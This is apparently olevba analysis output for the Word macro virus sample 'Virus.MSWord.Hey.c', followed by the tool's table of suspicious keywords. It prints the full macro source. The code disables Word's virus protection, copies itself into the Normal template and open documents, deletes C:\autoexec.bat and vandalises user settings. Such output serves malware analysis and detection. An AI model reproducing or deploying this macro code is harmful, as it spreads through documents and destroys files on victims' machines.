olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hey.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hey.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.bas 
in file: Virus.MSWord.Hey.c - OLE stream: 'Macros/VBA/Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen(): Options.VirusProtection = 0
Application.Caption = "MIcroSOFT - DROW | lamp!!!?"
End Sub
Sub AutoNew()
©é£ã
End Sub
Sub ©é£ã()
Set ¤ = NormalTemplate.VBProject.VBComponents(1): Set ¡ = ActiveDocument.VBProject.VBComponents(1): Set £ = ThisDocument.VBProject.VBComponents(1):
If ¤.CodeModule.CountOfLines < 1 Then ¤.CodeModule.InsertLines 1, £.CodeModule.Lines(1, 40)
If ¡.CodeModule.CountOfLines < 1 Then ¡.CodeModule.InsertLines 1, £.CodeModule.Lines(1, 40)
End Sub
Sub DateiBeenden()
End Sub
Sub ExtrasMakro()
End Sub
Sub FormatZeichen()
©é£ã
End Sub
Sub HilfeInfo()
Kill "C:\autoexec.bat"
End Sub
Sub ExtrasOptionen()
Application.UserName = "Zeus"
Application.UserAddress = "HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA"
Application.UserInitials = "Dead"
Dialogs(wdDialogToolsOptions).Show
End Sub
Sub DateiSpeichernUnter()
Dialogs(wdDialogFileSaveAs).Show (1000)
End Sub
Sub BearbeitenEinfügen()
©é£ã
End Sub
Sub BearbeitenSuchen()
©é£ã
End Sub
Sub AutoClose()
©é£ã
MsgBox "", , ""
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

